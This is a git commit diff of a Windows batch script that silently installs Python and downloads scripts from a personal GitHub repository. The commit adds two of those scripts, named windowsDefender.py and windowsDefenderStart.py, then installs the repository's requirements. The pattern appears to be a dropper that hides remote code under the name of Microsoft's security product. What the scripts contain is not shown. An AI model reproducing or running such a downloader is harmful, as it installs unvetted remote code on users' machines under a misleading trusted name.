c0d63111fac30887ee1524cfa91d3689f876c108
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 18:59:51 +0200

    Update v.bat

--- v.bat
+++ v.bat
@@ -2,7 +2,8 @@ curl https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe -O
 python-3.10.7-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
 
 
-curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefenderStart.py -O
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
 
 pip install -r requirements.txt
